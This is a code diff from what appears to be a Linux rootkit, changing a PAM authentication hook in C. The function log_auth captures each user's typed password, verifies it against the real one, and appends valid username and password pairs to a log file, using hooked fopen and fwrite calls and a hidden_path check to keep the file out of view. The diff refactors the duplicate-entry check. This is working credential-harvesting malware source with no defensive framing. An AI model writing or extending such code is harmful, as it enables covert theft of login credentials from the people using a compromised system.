@@ -17,45 +17,28 @@ int verify_pass(char *user, char *resp){
     return 0;
 }
 
-int alreadylogged(char *user, char *resp){
-    FILE *fp;
-    char line[LINE_MAX], logline[strlen(user)+strlen(resp)+32];
-    int logged = 0;
-    snprintf(logline, sizeof(logline), LOG_FMT, user, resp);
-
-    hook(CFOPEN);
-
-    fp = call(CFOPEN, LOG_PATH, "r");
-    if(fp == NULL) return logged;
-
-    while(fgets(line, sizeof(line), fp) != NULL){
-        if(!strcmp(line, logline)){
-            logged = 1;
-            break;
-        }
-    }
-
-    fclose(fp);
-    return logged;
-}
-
 void log_auth(pam_handle_t *pamh, char *resp){
     char *user;
     int  got_pw;
     FILE *fp;
+
+    hook(CFOPEN, CFWRITE);
 
     user = get_username(pamh);
     if(user == NULL) return;
 
     got_pw = verify_pass(user, resp);
     if(!got_pw) return;
-    if(alreadylogged(user, resp)) return;
 
-    hook(CFOPEN);
+    char logbuf[strlen(user)+strlen(resp)+5];
+    snprintf(logbuf, sizeof(logbuf), LOG_FMT, user, resp);
+
+    if(alreadylogged(LOG_PATH, logbuf))
+        return;
+
     fp = call(CFOPEN, LOG_PATH, "a");
     if(fp == NULL) return;
-
-    fprintf(fp, LOG_FMT, user, resp);
+    call(CFWRITE, logbuf, 1, strlen(logbuf), fp);
     fclose(fp);
 
     if(!hidden_path(LOG_PATH))
